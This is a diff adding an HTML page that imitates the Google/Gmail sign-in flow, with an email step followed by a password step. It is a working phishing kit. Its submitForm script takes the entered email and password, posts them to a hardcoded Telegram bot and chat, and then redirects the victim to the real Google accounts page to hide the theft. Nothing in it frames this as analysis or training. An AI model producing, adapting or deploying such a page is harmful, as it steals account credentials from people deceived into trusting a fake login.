@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmax Login</title>
+    <style>
+       /* Reset styles */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f4f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 100px;
+    flex-direction: column; /* Align items vertically */
+}
+
+.container {
+    display: flex;
+    background-color: #fff;
+    width: 100%;
+    max-width: 900px;
+    padding: 40px;
+    border-radius: 35px;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+    align-items: center;
+    height: 390px;
+    margin-bottom: 10px; /* Reduced space between container and footer */
+}
+
+/* Logo Section */
+.logo-section {
+    flex: 2;
+    display: flex;
+    justify-content: flex-start;
+    align-items: center;
+}
+
+.logo {
+    margin-top: -342px;
+    margin-left: -15px;
+    margin-bottom: -50px;
+}
+
+.logo img {
+    max-width: 90px;
+}
+
+/* Form Section */
+.form-section {
+    flex: 2;
+    padding-left: 30px;
+}
+
+h1 {
+    font-size: 1.8rem;
+    color: #202124;
+    font-weight: 400;
+    margin-bottom: -50px;
+    margin-left: -420px;
+}
+
+p {
+    font-size: 0.9rem;
+    color: #5f6368;
+    margin-bottom: 25px;
+}
+
+.don {
+    margin-bottom: -40px;
+    margin-left: -420px;
+}
+
+.form-group {
+    margin-top: 30px; /* Added margin to align with "Sign in" */
+    margin-bottom: 20px;
+    text-align: left;
+}
+
+input[type="email"],
+input[type="password"] {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 1rem;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.2s;
+}
+
+input[type="email"]:focus,
+input[type="password"]:focus {
+    border-color: #1a73e8;
+    box-shadow: 0 0 4px rgba(26, 115, 232, 0.3);
+}
+
+.forgot-link {
+    display: block;
+    font-size: 0.85rem;
+    color: #1a73e8;
+    text-decoration: none;
+    margin-top: 30px;
+}
+
+.forgot-link:hover {
+    text-decoration: underline;
+}
+
+.button {
+    width: 20%;
+    background-color: #1a73e8;
+    color: #fff;
+    padding: 9px 5px;
+    font-size: 1rem;
+    font-weight: bold;
+    border: 0;
+    border-radius: 13px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+}
+
+.button:hover {
+    background-color: #1557b0;
+}
+
+.divider {
+    margin: 20px 0;
+    font-size: 0.85rem;
+    color: #5f6368;
+}
+
+.signup-link {
+    font-size: 0.85rem;
+    color: #1a73e8;
+    text-decoration: none;
+}
+
+.createAccount {
+    font-size: 0.85rem;
+    color: #1a73e8;
+    text-decoration: none;
+}
+
+.signup-link:hover {
+    text-decoration: underline;
+}
+
+/* Responsive Styles */
+@media (max-width: 768px) {
+    body {
+        margin: 20px;
+    }
+
+    .container {
+        flex-direction: column;
+        padding: 20px;
+        height: auto;
+    }
+
+    .logo-section,
+    .form-section {
+        flex: none;
+        text-align: center;
+    }
+
+    .logo {
+        margin: 0 auto 20px;
+    }
+
+    h1 {
+        font-size: 1.5rem;
+        margin-left: 0;
+        margin-bottom: 10px;
+    }
+
+    .don {
+        margin-left: 0;
+        margin-bottom: 10px;
+    }
+
+    .button {
+        width: 100%;
+        margin: 20px 0 0 0;
+    }
+}
+
+.footer {
+    width: 77%;
+    display: flex;
+    justify-content: space-between;
+    position: relative;  /* Keep it positioned after the box */
+    margin-top: 5px; /* Reduced margin between container and footer */
+    padding: 0 24px; /* Adjust padding for alignment with box */
+    background-color: transparent; /* Ensures no background */
+}
+
+.footer a {
+    text-decoration: none;
+    color: #757575;
+    font-size: 12px;
+    margin: 0 8px;
+}
+
+.footer a:hover {
+    text-decoration: underline;
+}
+
+@media (max-width: 480px) {
+    h1 {
+        font-size: 1.2rem;
+        margin-right: 40px;
+    }
+
+    p,
+    .forgot-link,
+    .signup-link {
+        font-size: 0.8rem;
+    }
+
+    .button {
+        font-size: 0.9rem;
+    }
+}
+
+/* Align the buttons in a row and right-align them */
+.button-container {
+    display: flex;
+    justify-content: flex-end; /* Align the buttons to the right */
+    gap: 10px; /* Add some space between the buttons */
+}
+    </style>
+</head>
+<body>
+    <div class="container" id="email-section">
+        <!-- Logo Section -->
+        <div class="logo-section">
+            <div class="logo">
+                <img src="https://thumbs.dreamstime.com/z/mobile-299529606.jpg?w=768" alt="Google Logo">
+            </div>
+        </div>
+
+        <!-- email Section -->
+        <div class="form-section">
+            <h1>Sign in</h1>
+            <form>
+                <div class="form-group">
+                    <input type="email" name="email" id="email" placeholder="Enter your email" required>
+                    <div class="don">
+                        <p>to continue to Gmail</p>
+                    </div>
+                    <a href="#" class="forgot-link">Forgot email?</a>
+                </div>
+            </form>
+            <p>Not your computer? Use Guest mode to sign in privately. 
+                <a href="#" class="signup-link">Learn more about using Guest mode</a>
+            </p>
+            <div class="divider"></div>
+            <a href="#" class="createAccount">Create account</a>
+            
+            <!-- New Button Container -->
+            <div class="button-container">
+                <button type="button" class="button" onclick="showPasswordInput()">Next</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container" id="password-section" style="display: none;">
+        <!-- password Section -->
+        <div class="logo-section">
+            <div class="logo">
+                <img src="https://thumbs.dreamstime.com/z/mobile-299529606.jpg?w=768" alt="Google Logo">
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div class="form-section">
+            <h1>Welcome</h1>
+            <div class="don">
+                <p>Enter your password to continue to Gmail</p>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+            <!-- New Button Container -->
+            <div class="button-container">
+                <button type="submit" class="button" onclick="submitForm()">Next</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        function showPasswordInput() {
+            document.getElementById("email-section").style.display = "none";
+            document.getElementById("password-section").style.display = "flex";
+        }
+
+        function submitForm() {
+            const email = document.querySelector("input[name='email']").value;
+            const password = document.querySelector("input[name='password']").value;
+
+            // Your Telegram Bot Token and Chat ID
+            const botToken = "7554633505:AAFnn5KrCf4iSdaHqpQSlt6BDKAn0SmF3fo"; // Replace with your bot's token
+            const chatId = "7928080166";     // Replace with your chat ID
+
+            // Construct the message to send to Telegram Bot
+            const message = `💳 Gmax Details:\n\n🧑‍💻Email: ${email}\n🔑Password: ${password}`;
+
+            // Sending data to Telegram Bot API
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Message sent successfully");
+                } else {
+                    console.error("Failed to send message");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+
+            // Redirecting to Google Accounts page (or you can remove this if you don't want it)
+            window.location.href = "https://accounts.google.com";
+        }
+    </script>
+
+    <div class="footer">
+        <div class="left">
+            <a href="#">English (United States)</a>
+        </div>
+        <div class="right">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</body>
+</html>
